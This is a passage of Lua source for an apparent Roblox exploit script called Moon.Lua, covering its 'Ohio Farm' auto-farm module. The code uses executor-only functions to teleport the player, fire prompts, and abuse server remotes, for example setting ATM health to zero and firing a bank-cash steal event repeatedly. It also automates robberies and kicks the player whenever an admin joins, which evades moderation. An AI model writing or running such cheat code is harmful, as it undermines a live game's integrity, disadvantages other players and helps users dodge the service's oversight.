										Name = "Keybind",
										Callback = function()
											v43:Set(not v43:Get())
										end,
									})
								end

								fn113()

								if setthreadidentity then
									pcall(setthreadidentity, oldTI or 8)
								end

								local function fn114(arg, arg2, arg3)
									if arg3 then
										for i = 1, #arg do
											if arg[i] == arg2 then
												return
											end
										end

										Insert(arg, arg2)
									else
										for i = 1, #arg do
											if arg[i] == arg2 then
												Remove(arg, i)
												break
											end
										end
									end
								end

								local v38 = v14:CreateTab({ Id = "ohio-farm", Name = "Ohio Farm" })

								local function fn115()
									local tbl31 = {
										AdminCheck = false,
										AutoLeave = true,
										AutoRewards = true,
										AutoMask = { Enabled = false, Mask = nil },
										FarmAura = {
											Enabled = false,
											Options = {
												"LockPick",
												"Item",
												"JewelryCase",
												"Cash",
												"Safe",
												"ATM",
												"Airdrop",
												"Work",
												"Cash Register",
												"Vehicle",
												"Job",
											},
										},
										AutoFarm = {
											Enabled = false,
											MinStashPrice = 2500,
											MinPrice = 100,
											MinCash = 500,
											Tasks = {
												"Stash Gem",
												"Permanent Item",
												"JewelryCase",
												"Money Printer",
												"Treasure",
												"Bank",
												"Bomb Robbery",
												"Cash",
												"Airdrop",
												"Price Item",
												"Safe",
												"Vehicle",
												"ATM",
												"Cash Register",
												"Present",
												"Luck Block",
												"Spin",
												"Component Box",
												"Craft Rollie",
												"Job",
											},
										},
										AutoSell = {
											Enabled = false,
											UseIgnore = true,
											Max = 10000,
											Ignore = {
												"AS Val",
												"AUG",
												"AWP",
												"Barrett M107",
												"FN FAL",
												"M1 Garand",
												"M249 SAW",
												"P90",
												"Scar L",
												"Raygun",
												"RPG",
												"Treasure Map",
												"Fire Extinguisher",
											},
										},
										AutoUse = false,
										AutoDisassemble = false,
										AutoRemove = false,
										AutoDumbell = false,
									}

									tbl31.AutoMask.Mask = ({ "Hockey Mask", "Surgeon Mask", "Black Bandana", "Blue Bandana", "Red Bandana" })[1]
									local v39 = nil
									local v40 = nil
									local v41 = nil
									local v42 = nil
									local v43 = nil
									local v44 = nil
									local tbl32 = {}
									local n7 = 0
									local tbl33 = {}
									local v45 = pairs
									local tbl34 = specialRoles or {}

									for _, v46 in v45(tbl34) do
										if typeof(v46) == "table" and typeof(v46.users) == "table" then
											for _, user in pairs(v46.users) do
												tbl33[user] = true
											end
										end
									end

									local tbl35 = {
										["2023 Present"] = true,
										["2024 Present"] = true,
										["Blue Lucky Block"] = true,
										["Gold Lucky Block"] = true,
										["Green Lucky Block"] = true,
										["Large Present"] = true,
										["Lucky Egg"] = true,
										["Medium Present"] = true,
										["Orange Lucky Block"] = true,
										["Purple Lucky Block"] = true,
										["Red Lucky Block"] = true,
										["Small Present"] = true,
										Electronics = true,
										Explosives = true,
										Materials = true,
										["Medical Supplies"] = true,
										Scrap = true,
										["Weapon Parts"] = true,
									}

									local tbl36 = {
										["Baseball Bat"] = true,
										Basketball = true,
										Bloxaide = true,
										["Bloxy Cola"] = true,
										Drone = true,
										Cake = true,
										["Stop Sign"] = true,
										["Spiked Baseball Bat"] = true,
										Sign = true,
										Glider = true,
										Flashlight = true,
										Knife = true,
										Skateboard = true,
										["Red Gloves"] = true,
										Apple = true,
										Baton = true,
										["Night Vision Goggles"] = true,
										["X-Ray Goggles"] = true,
										["Rusty Pipe"] = true,
										["Taser Gun"] = true,
										Maraca = true,
										Taco = true,
										Fireaxe = true,
										Pizza = true,
										["Riot Shield"] = true,
										Flashbang = true,
										Crowbar = true,
										Hoverboard = true,
										Guitar = true,
										["Green Paintball Gun"] = true,
										["Orange Paintball Gun"] = true,
										Katana = true,
										Burger = true,
										Chicken = true,
										Firework = true,
										Chocolates = true,
										["Fire Extinguisher"] = true,
									}

									local tbl37 = {
										Beans = 0,
										Stretcher = 0,
										["Ammo Box"] = 0,
										Coffee = 0,
										["Pepper Spray"] = 0,
										["Blue Paintball Gun"] = 0,
										["Green Paintball Gun"] = 0,
										["Orange Paintball Gun"] = 0,
										["Purple Paintball Gun"] = 0,
										Molotov = 0,
										Smoke = 0,
										["Ninja Star"] = 2,
										Tomahawk = 2,
										Donut = 0,
										C4 = 0,
										C5 = 0,
										["Light Vest"] = 0,
										["Medium Vest"] = 0,
										["Heavy Vest"] = 0,
										Bandage = 0,
										["Military Vest"] = 0,
										["EOD Vest"] = 0,
										["Military Armory"] = 2,
										Medkit = 0,
										["Candy Corn"] = 0,
										Handcuffs = 0,
									}

									local n8 = 0
									local n9 = 0

									local function fn116(arg)
										if not arg then
											return false
										end
										local v46 = FindFirstChild(workspace, "Game")
										local v47 = v46 and FindFirstChild(v46, "Entities")
										if not v47 or not IsDescendantOf(arg, v47) then
											return false
										end
										local v48 = FindFirstChild(v47, "ItemPickup")
										if v48 and IsDescendantOf(arg, v48) then
											return false
										end
										return IsA(arg, "ProximityPrompt") or IsA(arg, "ClickDetector")
									end

									local function fn117()
										return tbl31.AutoSell.Enabled or tbl31.AutoUse or tbl31.AutoDisassemble or tbl31.AutoRemove
									end

									local function fn118()
										for i = 1, #tbl32 do
											local v46 = tbl32[i]

											pcall(function()
												Disconnect(v46)
											end)
										end

										tbl32 = {}
									end

									local function fn119(arg)
										if tbl31.AdminCheck and tbl31.AutoLeave and arg and arg ~= LocalPlayer and tbl33[arg.UserId] then
											LocalPlayer:Kick("[Moon.Lua] ADMIN " .. tostring(arg.Name))
										end
									end

									local function fn120()
										fn118()
										if not tbl31.AdminCheck then
											return
										end
										local v46 = GetPlayerList()

										for i = 1, #v46 do
											fn119(v46[i])
										end

										Insert(tbl32, Connect(Players.PlayerAdded, fn119))
									end

									local function fn121()
										local getRewards = InvokeServer("getRewards")
										if typeof(getRewards) ~= "table" then
											return false
										end
										local flag4 = false

										if typeof(getRewards.playtimeRewards) == "table" then
											for k, playtimeReward in pairs(getRewards.playtimeRewards) do
												if typeof(playtimeReward) == "table" and playtimeReward.claimTime and playtimeReward.claimTime <= 0 and not playtimeReward.isClaimed then
													flag4 = InvokeServer("claimPlaytimeReward", k) or flag4
													Wait(0.2)
												end
											end
										end

										local currentDay = GetAttribute(LocalPlayer, "rewardDay") or getRewards.currentDay or 1
										local n10 = rewards and rewards.DailyRewards and #rewards.DailyRewards or currentDay

										if typeof(getRewards.dailyRewards) == "table" then
											for i = 1, Min(currentDay, n10) do
												local v46 = getRewards.dailyRewards["Day" .. i]

												if not (typeof(v46) == "table" and v46.isClaimed) then
													flag4 = InvokeServer("claimDailyReward", i) or flag4
													Wait(0.2)
												end
											end
										end

										return flag4
									end

									local function fn122()
										pcall(task.cancel, v42)
										v42 = nil
										if not tbl31.AutoRewards then
											return
										end

										v42 = Spawn(function()
											while tbl31.AutoRewards do
												local ok4, result4 = pcall(fn121)

												if not ok4 then
													warn("[OhioFarmRewards] " .. tostring(result4))
												end

												Wait(5)
											end
										end)
									end

									local function fn123()
										pcall(task.cancel, v43)
										v43 = nil
										if not tbl31.AutoMask.Enabled then
											return
										end

										v43 = Spawn(function()
											while tbl31.AutoMask.Enabled do
												local v46 = fn69()
												local mask = tbl31.AutoMask.Mask

												if v46 and mask and not fn87(LocalPlayer) and GetAttribute(v46, "Mask") ~= mask then
													local v47 = fn72(mask)

													if v47 then
														fn76(v47.guid)
														FireServer("wearMask", v47.guid)
													else
														fn93(mask)
													end
												end

												Wait(1)
											end
										end)
									end

									local function fn124()
										if not tbl31.AutoMask.Enabled then
											return true
										end
										local v46 = fn69()
										local mask = tbl31.AutoMask.Mask
										return v46 and mask and GetAttribute(v46, "Mask") == mask or false
									end

									local function fn125(arg)
										if typeof(arg) ~= "CFrame" then
											return arg
										end
										local position = arg.Position
										return CFrame.lookAt(arg.Position + NewVector3(0, -7.5, 0), position + NewVector3(0, -2.5, 0))
									end

									local function fn126(arg)
										if typeof(arg) ~= "CFrame" then
											return arg
										end
										local position = arg.Position
										return CFrame.lookAt(arg.Position + NewVector3(0, -3.7, 0), position + NewVector3(0, -2.5, 0))
									end

									local function fn127(arg)
										if not (arg and arg.guid and arg.ammoManager) then
											return
										end
										local v46 = fn69()
										local v47 = v46 and FindFirstChild(v46, "RightHand")
										if not v47 then
											return
										end

										if arg.ammoManager.UseAmmo and not arg.ammoManager:UseAmmo(1) then
											return
										end
										local position = v47.Position
										local n10 = position + NewVector3(0, 10, 10)
										local n11 = (n10 - position).Unit * (position - n10).Magnitude * 2
										fn76(arg.guid)
										FireServer("throwItem", arg.guid, n11, n10)

										if arg.ammoManager.ammo and arg.ammoManager.ammo <= 0 then
											fn77(arg.guid)
										end
									end

									local function fn128()
										if not fn72("Lockpick") and not fn87(LocalPlayer) then
											fn93("Lockpick")
											Wait(1)
										end

										local tbl38 = {}
										local tbl39 = {}
										local v46, v47, v48 = pairs(inventory.items or {})
										local n10 = 0
										local huge = math.huge
										local guid = nil

										for _, v49 in v46, v47, v48 do
											if not (not v49 or not v49.name) then
												n10 += 1

												if not (v49.name == "Treasure Map" or v49.isStashed or v49.permanent) then
													local sellPrice = v49.sellPrice

													if not (sellPrice and sellPrice >= 2500) then
														if sellPrice and v49.type ~= "Gun" and v49.ammoManager and v49.ammoManager.ammo then
															sellPrice *= v49.ammoManager.ammo
														end

														if sellPrice and sellPrice < huge then
															guid = v49.guid
															huge = sellPrice
														end

														local v50 = tbl37[v49.name]

														if v50 ~= nil then
															tbl38[v49.name] = (tbl38[v49.name] or 0) + 1

															if v50 < tbl38[v49.name] then
																Insert(tbl39, v49.guid)
															end
														end
													end
												end
											end
										end

										for i = 1, #tbl39 do
											fn77(tbl39[i])
										end

										if guid and n10 > 27 then
											fn77(guid)
										end
									end

									local function fn129()
										if not fn104(tbl31.AutoFarm.Tasks, "Bank") then
											return
										end
										local v46 = FindFirstChild(workspace, "BankRobbery")
										if not v46 then
											return
										end
										local now = tick()
										local v47 = FindFirstChild(v46, "VaultDoor")
										local v48 = FindFirstChild(v46, "AlarmLights")
										local v49 = v48 and FindFirstChild(v48, "SpotLight")
										local v50 = FindFirstChild(v46, "BankAlarmTrigger")

										if v47 and (n8 == 0 or now - n8 >= 6) then
											local Frag = fn72("Frag")

											if not Frag then
												fn93("Frag")
												Wait(1)
												Frag = fn72("Frag")
											end

											if Frag then
												fn80(fn125(NewCFrame(1121.56946, 11.4600649, -373.45105)), 0.2)
												fn127(Frag)
												fn80(fn125(NewCFrame(1121.56946, 11.4600649, -373.45105)), 1)
												n8 = now
											end
										elseif v49 and v50 and not v49.Enabled then
											fn80(NewCFrame(v50.Position + NewVector3(0, 5, 0)), 0.5)
										end
									end

									local function fn130()
										if not fn104(tbl31.AutoFarm.Tasks, "Bomb Robbery") then
											return
										end
										local v46 = FindFirstChild(workspace, "GemRobbery")
										local v47 = v46 and FindFirstChild(v46, "Rubble")
										if not (v47 and FindFirstChild(v47, "Rock")) then
											return
										end
										local now = tick()

										if n9 == 0 or now - n9 >= 20 then
											local Frag = fn72("Frag")

											if not Frag then
												fn93("Frag")
												Wait(1)
												Frag = fn72("Frag")
											end

											if Frag then
												fn80(fn125(NewCFrame(1687.90503, 25, -717.894592)), 0.2)
												fn127(Frag)
												fn80(fn125(NewCFrame(1687.90503, 25, -717.894592)), 1)
												n9 = now
											end
										end
									end

									local function fn131()
										if GetAttribute(LocalPlayer, "bankCash") == 0 then
											return
										end
										local v46 = FindFirstChild(workspace, "BankRobbery")
										local v47 = v46 and FindFirstChild(v46, "BankCash")
										local v48 = v47 and FindFirstChild(v47, "Main")
										local v49 = v48 and FindFirstChild(v48, "Attachment") and FindFirstChild(v48.Attachment, "ProximityPrompt")
										if not (v48 and v49) then
											return
										end
										local v50 = fn70()

										if v50 then
											v50:ChangeState(Enum.HumanoidStateType.Jumping)
										end

										local v51 = fn125(NewCFrame(v48.Position + NewVector3(0, -5, 0)))
										fn80(v51, 0.5)

										if GetAttribute(LocalPlayer, "bankCash") ~= 0 then
											for i = 1, 20 do
												FireServer("steaӏBankCash")
											end
										end

										fn80(v51, 0.5)
									end

									local function fn132()
										local v46 = FindFirstChild(workspace, "ATMs")
										if not v46 then
											return
										end
										local v47 = GetChildren(v46)

										for i = 1, #v47 do
											local v48 = v47[i]
											local primaryPart = v48.PrimaryPart or FindFirstChildWhichIsA(v48, "BasePart")
											local flag4

											if primaryPart then
												flag4 = (GetAttribute(v48, "health") or 0) > 1
											else
												flag4 = primaryPart
											end

											if flag4 then
												local v49 = fn70()

												if v49 then
													v49:ChangeState(Enum.HumanoidStateType.Jumping)
												end

												local v50 = fn125(primaryPart.CFrame)
												fn80(v50, 0.3)
												FireServer("setATMHealth", GetAttribute(v48, "atmId"), 0)
												SetAttribute(v48, "health", 0)
												SetAttribute(v48, "isDestroyed", true)
												fn80(v50, 0.8)
												return
											end
										end
									end

									local function fn133()
										if not fn72("Lockpick") and not fn87(LocalPlayer) then
											fn93("Lockpick")
											return
										end

										if not fn71() then
											return
										end
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Entities")
										if not game_ then
											return
										end
										local v46 = GetDescendants(game_)

										for i = 1, #v46 do
											local v47 = v46[i]

											if IsA(v47, "ProximityPrompt") and v47.Enabled and fn116(v47) then
												local parent = v47.Parent

												if parent and not IsA(parent, "BasePart") then
													parent = parent.Parent
												end

												if parent and IsA(parent, "BasePart") then
													fn80(fn125(parent.CFrame), 0.5)
													fireproximityprompt(v47)
													fn80(fn125(parent.CFrame), 3)
													return
												end
											end
										end
									end

									local n10 = 0
									local n11 = 2
									local n12 = 2

									local function fn134(arg)
										local v46 = GetChildren(arg)
										local n13 = 0

										for i = 1, #v46 do
											local v47 = v46[i]

											if StringFind(v47.Name, "GemPlacement", 1, true) and GetAttribute(v47, "gemName") then
												n13 += 1
											end
										end

										return n13
									end

									local function fn135()
										local now = tick()
										if now - n10 < 5 then
											return
										end
										n10 = now
										local v46 = fn71()
										if not v46 then
											return
										end

										local ok4, result4 = pcall(function()
											return debug.getupvalues(Houses.triggerSign)[2]
										end)

										if not ok4 or typeof(result4) ~= "table" then
											return
										end
										local tbl38 = {}
										local v47 = pairs
										local items = inventory.items or {}
										local n13 = 0

										for _, item in v47(items) do
											if item and (item.subtype == "valuable" or item.subtype == "gem") and item.sellPrice and item.sellPrice >= tbl31.AutoFarm.MinStashPrice then
												n13 += 1
												table.insert(tbl38, { item = item, order = n13 })
											end
										end

										if n13 == 0 then
											print(Format("[OhioAutoFarm][StashGem] qualifying gems: 0 (min sellPrice: %d)", tbl31.AutoFarm.MinStashPrice))
											return
										end

										table.sort(tbl38, function(arg, arg2)
											local n14 = tonumber(arg.item.sellPrice) or 0
											local n15 = tonumber(arg2.item.sellPrice) or 0
											if n14 == n15 then
												return arg.order < arg2.order
											end
											return n14 > n15
										end)

										print(Format("[OhioAutoFarm][StashGem] qualifying gems: %d, highest sellPrice: %d", n13, tbl38[1].item.sellPrice))

										local function fn136()
											local v48 = FindFirstChild(workspace, "HousingPlots")
											if not v48 then
												return nil
											end
											local v49 = GetChildren(v48)

											for i = 1, #v49 do
												local v50 = v49[i]
												if not FindFirstChild(v50, "Mailbox") then
													return v50
												end
											end

											return nil
										end

										local function fn137(house)
											if not house then
												return nil
											end
											result4.inDialog = false

											if InvokeServer("rentHouse", house) then
												result4.house = house

												pcall(function()
													result4:UpdateData()
													result4.Permissions:resetPermissions("house")
													result4.HomeManager:setOpen("Menu")
												end)
											end

											dialogQueue:Next()
										end

										local house = result4.house

										if not house then
											local v48 = fn136()
											house = fn137(v48)
										end

										if not house then
											return
										end
										local v48 = nil

										if house.Building then
											local v49 = GetChildren(house.Building)
											v48 = nil

											for i = 1, #v49 do
												v48 = FindFirstChild(v49[i], "Furniture")
												if not v48 then
													v48 = nil
													continue
												end
												break
											end
										end

										if not v48 then
											return
										end
										local v49 = GetChildren(v48)
										local n14 = 1
										local n15 = 0
										local n16 = 0
										local n17 = 0
										local n18 = 0

										for i = 1, #v49 do
											if not (#tbl38 < n14) then
												local v50 = v49[i]
												local v51 = GetAttribute(v50, "guid")
												local furnitureByGUID = v51 and ClientHouseFurniture:GetFurnitureByGUID(v51)
												local name2 = furnitureByGUID and furnitureByGUID.name and FurnitureDefs[furnitureByGUID.name]

												if furnitureByGUID and furnitureByGUID.owner == LocalPlayer and name2 and name2.furnitureType == "GemDisplay" then
													n15 += 1
													local tbl39 = {}
													local v52 = GetChildren(v50)

													for i2 = 1, #v52 do
														local v53 = v52[i2]

														if StringFind(v53.Name, "GemPlacement", 1, true) and not GetAttribute(v53, "gemName") then
															table.insert(tbl39, v53)
														end
													end

													n16 += #tbl39

													if #tbl39 > 0 then
														local primaryPart = tbl39[1]

														if v50.PrimaryPart and FindFirstChild(v50.PrimaryPart, "ProximityPrompt") then
															primaryPart = v50.PrimaryPart
														end

														local cFrame = v46.CFrame
														local cFrame2

														if primaryPart and IsA(primaryPart, "BasePart") then
															cFrame2 = primaryPart.CFrame
														else
															cFrame2 = cFrame
														end

														fn79(v46, cFrame2, 0.2)
														local now2 = tick()

														for i2 = 1, #tbl39 do
															if not (#tbl38 < n14) then
																local item = tbl38[n14].item
																local primaryPart2 = tbl39[i2]

																if v50.PrimaryPart and FindFirstChild(v50.PrimaryPart, "ProximityPrompt") then
																	primaryPart2 = v50.PrimaryPart
																end

																local v53 = fn134(v50)
																fn76(item.guid)
																fn79(v46, cFrame2, 0.2)
																FireServer("updateGemDisplay", furnitureByGUID.guid, primaryPart2.Name, item.guid)
																local n19 = tick() + n11
																local n20 = 0

																while tick() < n19 do
																	fn79(v46, cFrame2, 0.1)

																	if v53 < fn134(v50) then
																		n20 += 1
																		if not (n12 <= n20) then
																			continue
																		end
																	else
																		n20 = 0
																		continue
																	end

																	break
																end

																if not (n20 < n12) then
																	fn79(v46, cFrame2, 0.3)

																	if not (fn134(v50) <= v53) then
																		n17 += 1
																		n14 += 1
																		continue
																	end
																end
															end

															break
														end

														if v46.Parent then
															v46.CFrame = cFrame
															fn78(v46)
														end

														n18 += tick() - now2
													end
												end

												continue
											end

											break
										end

										print(Format("[OhioAutoFarm][StashGem] gem displays: %d, free slots: %d, placed: %d/%d, dwell: %.2fs", n15, n16, n17, n13, n18))
									end

									local function fn136()
										local v46 = fn71()
										local v47 = FindFirstChild(workspace, "ATMs")
										if not v46 or not v47 then
											return
										end
										local v48 = GetChildren(v47)

										for i = 1, #v48 do
											local v49 = v48[i]
											local primaryPart = v49.PrimaryPart or FindFirstChildWhichIsA(v49, "BasePart")
											local flag4

											if primaryPart then
												flag4 = (GetAttribute(v49, "health") or 0) > 1
											else
												flag4 = primaryPart
											end

											flag4 = flag4 and (v46.Position - primaryPart.Position).Magnitude <= 35

											if flag4 then
												Wait(0.1)
												SetAttribute(v49, "health", 0)
											end
										end
									end

									local function fn137(arg)
										local v46 = fn71()
										local v47 = arg and FindFirstChild(arg, "Mobs")
										if not v46 or not v47 then
											return
										end
										local v48 = GetChildren(v47)
										local v49 = nil
										local v50 = nil

										for i = 1, #v48 do
											local v51 = v48[i]
											local primaryPart = v51.PrimaryPart
											primaryPart = primaryPart and (v46.Position - primaryPart.Position).Magnitude

											if primaryPart and primaryPart <= 35 and (not v49 or primaryPart < v49) then
												v49 = primaryPart
												v50 = v51
											end
										end

										if v50 then
											SetAttribute(v50, "health", 0)
										end
									end

									local function fn138()
										local local_ = workspace.Game and workspace.Game.Local
										local v46 = local_ and FindFirstChild(local_, "droppables")
										if not v46 then
											return
										end
										local v47 = GetChildren(v46)

										for i = 1, #v47 do
											local v48 = v47[i]

											if v48 and v48.Name == "Money Printer" then
												local v49 = FindFirstChild(v48, "Display")
												local num = v49 and FindFirstChild(v49, "SurfaceGui") and FindFirstChild(v49.SurfaceGui, "TextLabel") and tonumber(v49.SurfaceGui.TextLabel.Text)

												if num and num <= 3 and v49 then
													local v50 = fn70()

													if v50 then
														v50:ChangeState(Enum.HumanoidStateType.Jumping)
													end

													fn80(fn125(v49.CFrame), 0.5)
													return
												end
											end
										end
									end

									local function fn139()
										local treasureMap = fn72("Treasure Map")

										if treasureMap then
											fn76(treasureMap.guid)
										end

										local local_ = workspace.Game and workspace.Game.Local
										local v46 = local_ and FindFirstChild(local_, "Debris")
										if not v46 then
											return
										end
										local v47 = GetChildren(v46)

										for i = 1, #v47 do
											local v48 = v47[i]

											if IsA(v48, "BasePart") then
												local v49 = FindFirstChildOfClass(v48, "ProximityPrompt")

												if v49 and v49.Enabled and v49.ActionText == "Dig" then
													local v50 = fn70()

													if v50 then
														v50:ChangeState(Enum.HumanoidStateType.Jumping)
													end

													local v51 = fn125(v48.CFrame)
													fn80(v51, 0.4)

													if treasureMap then
														fn76(treasureMap.guid)
													end

													for i2 = 1, 5 do
														if treasureMap then
															fn76(treasureMap.guid)
														end

														fireproximityprompt(v49)
														fn80(v51, 0.2)
													end

													fn80(v51, 4)
													return
												end
											end
										end
									end

									local function fn140()
										if (GetAttribute(LocalPlayer, "slotSpins") or 0) <= 0 then
											return
										end
										local v46 = FindFirstChild(workspace, "ServerFurniture")
										if not v46 then
											return
										end
										local v47 = GetChildren(v46)

										for i = 1, #v47 do
											local v48 = v47[i]

											if IsA(v48, "Model") and GetAttribute(v48, "furnitureName") == "SlotMachine" then
												local v49 = FindFirstChild(v48, "Hitbox")

												if v49 then
													local v50 = GetDescendants(v48)

													for i2 = 1, #v50 do
														local v51 = v50[i2]

														if IsA(v51, "ProximityPrompt") then
															fn80(fn125(v49.CFrame), 0.2)
															fireproximityprompt(v51)
															return
														end
													end
												end

												return
											end
										end
									end

									local function fn141()
										local v46 = FindFirstChild(workspace, "Jobs")

										if v46 then
											local v47 = GetChildren(v46)

											for i = 1, #v47 do
												local v48 = FindFirstChild(v47[i], "Triggers")
												local v49 = v48 and FindFirstChild(v48, "BeginJobTrigger")
												local proximityPrompt = v49 and v49.ProximityPrompt

												if proximityPrompt then
													fn80(fn126(v49.CFrame), 0.2)
													fireproximityprompt(proximityPrompt)
													break
												end
											end
										end

										local local_ = workspace.Game and workspace.Game.Local
										local v47 = local_ and FindFirstChild(local_, "Rubbish")

										if v47 then
											local v48 = GetChildren(v47)

											for i = 1, #v48 do
												local v49 = v48[i]
												local primaryPart = v49.PrimaryPart and FindFirstChildOfClass(v49.PrimaryPart, "ClickDetector")

												if primaryPart then
													fireclickdetector(primaryPart)
												end
											end
										end
									end

									local function fn142()
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Airdrops")
										if not game_ then
											return
										end
										local v46 = GetChildren(game_)

										for i = 1, #v46 do
											local v47 = v46[i]
											local v48 = FindFirstChildOfClass(v47, "MeshPart")

											if v48 then
												local v49 = GetDescendants(v47)

												for i2 = 1, #v49 do
													local v50 = v49[i2]

													if IsA(v50, "ProximityPrompt") and v50.Enabled then
														local v51 = fn70()

														if v51 then
															v51:ChangeState(Enum.HumanoidStateType.Jumping)
														end

														local v52 = fn125(v48.CFrame)
														fn80(v52, 0.5)
														fireproximityprompt(v50)
														fn80(v52, 0.2)
														return
													end
												end
											end
										end
									end

									local function fn143()
										local Fists = fn72("Fists")
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Props")
										local v46 = game_ and FindFirstChild(game_, "CashRegister")
										if not v46 then
											return
										end
										local v47 = GetChildren(v46)

										for i = 1, #v47 do
											local v48 = v47[i]
											local v49 = GetAttribute(v48, "guid")
											local v50 = GetAttribute(v48, "state")
											local primaryPart = v48.PrimaryPart

											if v49 and v50 ~= "destroyed" and primaryPart then
												fn80(fn125(primaryPart.CFrame), 0.2)
												Fists = Fists and Fists.guid
												fn96(Fists, "meleepunch", v48)
												fn80(fn125(primaryPart.CFrame), 0.8)
												return
											end
										end
									end

									local function fn144()
										if not fn72("Lockpick") and not fn87(LocalPlayer) then
											fn93("Lockpick")
											return
										end
										local v46 = fn102()

										for i = 1, #v46 do
											local v47 = v46[i]
											if v47.prompt then
												fn80(fn125(NewCFrame(v47.pos)), 3)
												return
											end
										end
									end

									local tbl38

									tbl38 = {
										ItemCache = {},
										PriceCache = {},
										AttackCooldown = {},
										Cases = nil,
										CasesFolder = nil,
										CasesAt = 0,
										getItemSource = function(arg)
											if not arg then
												return
											end
											local v46 = tbl38.ItemCache[arg]
											if v46 ~= nil then
												return v46 or nil
											end
											local module = nil

											pcall(function()
												local fn145 = nil

												fn145 = function(arg2)
													local v47 = FindFirstChild(arg2, arg)
													if v47 then
														return v47
													end

													for _, v48 in pairs(GetChildren(arg2)) do
														if IsA(v48, "Folder") then
															local v49 = fn145(v48)
															if v49 then
																return v49
															end
														end
													end

													return nil
												end

												for _, v47 in pairs(GetChildren(ReplicatedStorage.devv.shared.Indicies.v3items.bin)) do
													if IsA(v47, "Folder") then
														local v48 = fn145(v47)
														if v48 then
															module = require(v48)
															break
														end
													end
												end
											end)

											tbl38.ItemCache[arg] = module or false
											return module
										end,
										getSellPrice = function(arg)
											local v46 = tbl38.PriceCache[arg]
											if v46 ~= nil then
												return v46 or nil
											end
											local v47 = tbl38.getItemSource(arg)
											local num = tonumber(v47 and v47.sellPrice)
											tbl38.PriceCache[arg] = num or false
											return num
										end,
										getCases = function()
											local v46 = FindFirstChild(workspace, "GemRobbery")
											local v47 = v46 and FindFirstChild(v46, "JewelryCases")

											if not v47 then
												tbl38.Cases = nil
												tbl38.CasesFolder = nil
												return {}
											end

											local flag4 = tbl38.CasesFolder ~= v47 or not tbl38.Cases

											if not flag4 then
												local casesAt = tbl38.CasesAt
												flag4 = tick() - casesAt >= 0.25
											end

											if flag4 then
												local cases = {}
												local v48 = GetDescendants(v47)

												for i = 1, #v48 do
													local v49 = v48[i]

													if IsA(v49, "Model") and v49.Name == "JewelryCase" then
														Insert(cases, #cases + 1, v49)
													end
												end

												tbl38.Cases = cases
												tbl38.CasesFolder = v47
												tbl38.CasesAt = tick()
											end

											return tbl38.Cases
										end,
										getStealPrompts = function(arg)
											local tbl39 = {}
											local v46 = GetDescendants(arg)

											for i = 1, #v46 do
												local v47 = v46[i]

												if IsA(v47, "ProximityPrompt") and v47.ActionText == "Steal" then
													local parent = v47.Parent

													while parent and parent ~= arg and not IsA(parent, "Model") do
														parent = parent.Parent
													end

													if parent and parent ~= arg and IsA(parent, "Model") then
														local parent2 = v47.Parent

														while parent2 and parent2 ~= parent and not IsA(parent2, "BasePart") do
															parent2 = parent2.Parent
														end

														if not parent2 or not IsA(parent2, "BasePart") then
															parent2 = FindFirstChildWhichIsA(parent, "BasePart", true)
														end

														Insert(tbl39, #tbl39 + 1, { model = parent, prompt = v47, part = parent2 })
													end
												end
											end

											return tbl39
										end,
										attack = function(arg, arg2)
											if not arg2 or not arg2.CanCollide then
												return false
											end
											local now = tick()
											if now - (tbl38.AttackCooldown[arg] or 0) < 0.25 then
												return false
											end
											local Fists = fn72("Fists")
											local v46 = fn96(Fists and Fists.guid, "meleepunch", arg2)

											if v46 then
												tbl38.AttackCooldown[arg] = now
											end

											return v46
										end,
										runFarmAura = function(arg)
											if flag3 then
												return
											end
											local v46 = tbl38.getCases()

											for i = 1, #v46 do
												local v47 = v46[i]
												local v48 = FindFirstChild(v47, "Glass")

												if v48 and IsA(v48, "BasePart") and (arg.Position - v48.Position).Magnitude <= 30 then
													if v48.CanCollide then
														tbl38.attack(v47, v48)
													end

													local v49 = tbl38.getStealPrompts(v47)

													for i2 = 1, #v49 do
														local v50 = v49[i2]

														if v50.prompt.Enabled and (arg.Position - (v50.part or v48).Position).Magnitude <= 30 then
															fireproximityprompt(v50.prompt)
														end
													end
												end
											end
										end,
										runAutoFarmHighValue = function()
											local tbl39 = {}
											local v46 = fn71()
											local v47 = tbl38.getCases()

											for i = 1, #v47 do
												local v48 = v47[i]
												local v49 = FindFirstChild(v48, "Glass")

												if v49 and IsA(v49, "BasePart") then
													local v50 = tbl38.getStealPrompts(v48)

													for i2 = 1, #v50 do
														local v51 = v50[i2]
														local v52 = tbl38.getSellPrice(v51.model.Name)

														if v52 and v52 >= tbl31.AutoFarm.MinPrice then
															local part = v51.part or v49

															Insert(tbl39, #tbl39 + 1, {
																case = v48,
																glass = v49,
																prompt = v51.prompt,
																part = part,
																price = v52,
																distance = v46 and (v46.Position - part.Position).Magnitude or math.huge,
															})
														end
													end
												end
											end

											if #tbl39 == 0 then
												return false
											end

											table.sort(tbl39, function(arg, arg2)
												if arg.price == arg2.price then
													return arg.distance < arg2.distance
												end
												return arg.price > arg2.price
											end)

											if flag3 then
												return true
											end
											local v48 = tbl39[1]
											fn80(fn125(v48.part.CFrame), 0.15)
											if flag3 then
												return true
											end

											if v48.glass.CanCollide then
												fn80(fn125(v48.glass.CFrame), 0.15)

												if not flag3 then
													tbl38.attack(v48.case, v48.glass)
												end
											elseif v48.prompt.Enabled then
												fireproximityprompt(v48.prompt)
											end

											return true
										end,
										runAutoFarmRefresh = function()
											if flag3 then
												return
											end
											local v46 = fn71()
											if not v46 then
												return
											end
											local v47 = tbl38.getCases()
											local v48 = nil
											local v49 = nil
											local v50

											for i = 1, #v47 do
												local v51 = v47[i]
												local v52 = FindFirstChild(v51, "Glass")

												if v52 and IsA(v52, "BasePart") and v52.CanCollide then
													local magnitude = (v46.Position - v52.Position).Magnitude

													if not v48 or magnitude < v48 then
														v48 = magnitude
														v49 = v51
														v50 = v52
													end
												end
											end

											if v49 and v50 then
												fn80(fn125(v50.CFrame), 0.15)

												if not flag3 then
													tbl38.attack(v49, v50)
												end
											end
										end,
									}

									local function fn145(...) end

									local function fn146()
										pcall(task.cancel, v39)
										v39 = nil
										if not tbl31.FarmAura.Enabled then
											return
										end

										v39 = Spawn(function()
											while tbl31.FarmAura.Enabled do
												pcall(fn145)
												Wait(0.03)
											end
										end)
									end

									local function fn147(arg)
										if arg then
											arg = arg.PrimaryPart or FindFirstChildWhichIsA(arg, "BasePart")
										end

										return arg
									end

									local function fn148(arg, arg2)
										if not arg then
											return false
										end
										local v46 = tbl38.getItemSource(arg)
										if not v46 then
											return false
										end

